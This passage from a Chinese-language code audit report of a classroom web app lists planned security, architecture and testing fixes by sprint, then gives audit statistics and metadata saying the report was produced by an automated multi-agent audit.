### Sprint 2（下周，2–3 人天）：安全与可观测性
- C-2：插件 executionMode 默认改 worker（核心安全单点）
- H-1：CSRF double-submit 中间件
- H-4：插件 deploy 脚本路径校验
- H-5：考勤 IDOR + 全量 IDOR 审计

### Sprint 3（2 周，3 人天）：架构债务
- C-5：SDK 边界修复（前端 16+ 处穿透）
- H-6：事件总线迁移（~50 处 emit 调用）
- H-7：logger 移到 `packages/core/`
- H-10：拆分 8 个巨型路由函数（首选 `classroom.ts`）
- M-3：`plugin-sdk/index.ts` 重导出清理
- M-4：composition module 并行 DI 合并

### Sprint 4（持续）：测试与质量
- H-9：`setTimeout` 改 `vi.waitFor`（13 处）
- M-5：`bridge-sdk.ts` 空 catch 加 logger
- M-7：拆 `generateBootstrapCode` 753 行
- M-8：UI 25 个空 catch 加错误状态
- M-9：5 个高 any 文件类型化
- M-10：迁移补 DOWN 块
- M-11：`MockCapability` 修复

### 总工时估算：~15 个工作日（按优先级串行修复）

---

## 9. 附录：审计数据采集摘要

### 9.1 工具与方法
- **CodeGraph**：`.codegraph/codegraph.db`（48.49 MB，10,706 节点，36,327 边，1,012 文件）
- **架构验证**：`codegraph explore`/`codegraph impact` + 边界 ffgrep
- **静态分析**：`ffgrep -cE` 模式计数 + `codegraph query` 符号调用追踪
- **目标文件读取**：offset/limit 范围读取，未整文件加载

### 9.2 关键统计
- 1,022 个 TS/TSX 文件（716 TS + 265 TSX + 16 JS + 6 Liquid + 5 YAML + 4 Python）
- 181 个 `app.{verb}` 路由定义（来自 `server/routes/`）
- 11 个 SQLite 迁移文件
- 265 个测试文件、~1,725 个 `it()` 用例、585 个 `describe` 块
- 2,355 处 `any`/`@ts-ignore`/`as any`/`@ts-expect-error`（分布于 328 文件）
- 121 处空 `catch {}`（分布于 25 文件）

### 9.3 最大的 10 个文件
| 文件 | 行数 |
| --- | --- |
| `src/features/whiteboard/InteractiveWhiteboard.tsx` | 4,161 |
| `packages/core/plugin-host/index.ts` | 2,823 |
| `src/components/LiveClassroomView.tsx` | 2,351 |
| `src/App.tsx` | 2,226 |
| `packages/plugins/builtin.ts` | 1,943 |
| `src/components/TimetableManager.tsx` | 1,862 |
| `src/components/AdminPanel.tsx` | 1,801 |
| `server/routes/classroom.ts` | 1,798 |
| `server/routes/roster.ts` | 1,632 |
| `packages/core/worker-runtime/worker-manager.ts` | 1,533 |

---

## 10. 报告元数据

- **生成方式**：🔒 Security + 🏗 Architecture + 🧹 Code Quality + 🧪 Testing & Ops 四个并行 agent 审计结果合成
- **交叉验证**：所有 HIGH 及以上条目至少在 2 个 agent 的视野中出现
- **审计者**：MiniMax-M3 自动化审计（4 个独立 agent + 综合）
- **下次审计建议**：每个 minor 版本发布后（如 0.3.23）+ 每个 major 版本前强制审计